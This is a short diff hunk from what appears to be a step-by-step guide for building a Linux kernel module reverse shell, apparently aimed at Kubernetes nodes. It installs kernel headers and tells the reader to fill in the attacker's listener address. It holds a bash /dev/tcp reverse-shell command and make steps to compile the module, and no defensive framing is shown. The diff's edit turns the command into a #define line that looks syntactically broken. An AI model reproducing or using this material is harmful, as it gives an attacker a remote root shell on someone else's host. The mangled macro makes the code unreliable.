@@ -41,7 +41,7 @@ apt install -y build-essential linux-headers-$(uname -r)
 # File: k8s-lkm-reverse-shell.c
 # Replace <your-ip> and <port> with your attacker's listener
 
-static char command[50] = "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1";
+#define REVERSE_SHELL_CMD \ "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1";
 
 # Step 3: Compile the kernel module
 make clean && make
